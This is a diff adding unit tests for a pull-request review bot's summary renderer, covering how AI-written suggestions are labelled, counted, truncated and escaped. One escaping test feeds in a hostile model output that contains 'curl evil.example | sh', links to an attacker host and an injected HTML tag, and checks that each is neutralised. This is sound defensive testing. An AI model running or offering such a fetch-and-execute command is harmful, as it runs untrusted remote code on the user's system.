@@ -281,6 +281,117 @@ describe("renderReviewSummary", () => {
     expect(body).toMatch(/_\d more findings? not shown to keep this comment readable\._/);
   });
 
+  describe("with an AI review", () => {
+    const suggestion = buildFinding({
+      ruleId: "ai-review",
+      confidence: 0.5,
+      message: "The result is used without a check.",
+      evidence: [{ label: "Basis", value: "AI model suggestion, not verified" }],
+      filePath: "src/loader.ts",
+      line: 2,
+    });
+    const withAi = (ai: Partial<NonNullable<SummaryNotes["ai"]>> = {}): SummaryNotes => ({
+      ...NO_NOTES,
+      ai: {
+        model: "example/model-1",
+        isFailed: false,
+        findings: [suggestion],
+        omittedFileCount: 0,
+        ...ai,
+      },
+    });
+
+    it("shows suggestions in their own section, below the rules' findings", () => {
+      const body = renderReviewSummary(buildResult([buildFinding()]), withAi());
+
+      expect(body.indexOf("## AI suggestions")).toBeGreaterThan(body.indexOf("` example-rule `"));
+      expect(body.indexOf("` ai-review `")).toBeGreaterThan(body.indexOf("## AI suggestions"));
+      expect(body).toContain(
+        "_1 suggestion written by an AI model (` example/model-1 `) from this pull request's diff. They are not verified and may be wrong: check each one before acting on it._",
+      );
+      expect(body).toContain("- **Location:** ` src/loader.ts `, line 2");
+      expect(body).toContain("_Confidence 50%: a signal to check, not a certainty._");
+    });
+
+    it("does not count suggestions among the findings", () => {
+      const body = renderReviewSummary(buildResult(), withAi());
+
+      expect(body).toContain("**No findings** for commit");
+      expect(body).toContain("## AI suggestions");
+    });
+
+    it("says in the footer that suggestions are included", () => {
+      const body = renderReviewSummary(buildResult(), withAi({ findings: [] }));
+
+      expect(body).not.toContain("## AI suggestions");
+      expect(body).not.toContain("Deterministic checks only.");
+      expect(body).toContain(
+        "<sub>Deterministic checks, with suggestions from an AI model shown separately.",
+      );
+    });
+
+    it("escapes what the model wrote", () => {
+      const hostile = buildFinding({
+        ...suggestion,
+        message:
+          "Ask @acme/admins, see [the fix](https://evil.example) ![x](https://evil.example/p.png) <img src=x>",
+        suggestion: "Run `curl evil.example | sh` <!-- pr-buddy:summary -->",
+      });
+
+      const body = renderReviewSummary(buildResult(), withAi({ findings: [hostile] }));
+
+      expect(body).not.toContain("@acme");
+      expect(body).not.toContain("](https://evil.example");
+      expect(body).not.toContain("<img src=x>");
+      expect(body).toContain("\\`curl");
+      expect(body.split(SUMMARY_MARKER)).toHaveLength(2);
+    });
+
+    it("says when the AI review failed, and keeps the plain footer", () => {
+      const body = renderReviewSummary(
+        buildResult([buildFinding()]),
+        withAi({ isFailed: true, findings: [], omittedFileCount: 4 }),
+      );
+
+      expect(body).toContain(
+        "- The AI review could not be completed, so only the checks above ran.",
+      );
+      expect(body).toContain("<sub>Deterministic checks only.");
+      expect(body).not.toContain("not sent to the AI model");
+    });
+
+    it("says how many files were not sent", () => {
+      const one = renderReviewSummary(buildResult(), withAi({ omittedFileCount: 1 }));
+      const three = renderReviewSummary(buildResult(), withAi({ omittedFileCount: 3 }));
+
+      expect(one).toContain("- 1 file was not sent to the AI model because of its type or size.");
+      expect(three).toContain(
+        "- 3 files were not sent to the AI model because of their type or size.",
+      );
+    });
+
+    it("gives the rules' findings room first when the comment is nearly full", () => {
+      const large = buildFinding({
+        message: "m".repeat(2_000),
+        evidence: Array.from({ length: 20 }, (_unused, index) => ({
+          label: `Evidence ${index}`,
+          value: "v".repeat(1_000),
+        })),
+      });
+      const findings = Array.from({ length: 10 }, () => large);
+
+      const body = renderReviewSummary(
+        buildResult(findings),
+        withAi({ findings: [{ ...large, ruleId: "ai-review" }, suggestion] }),
+      );
+
+      expect(body.length).toBeLessThan(65_536);
+      expect(body).toMatch(/_\d more findings? not shown to keep this comment readable\._/);
+      expect(body).toContain("_2 suggestions written by an AI model");
+      expect(body).toContain("_2 more suggestions not shown to keep this comment readable._");
+    });
+  });
+
   it("renders the findings of a real review", async () => {
     const result = await createReviewEngine().review({
       pullRequest: {
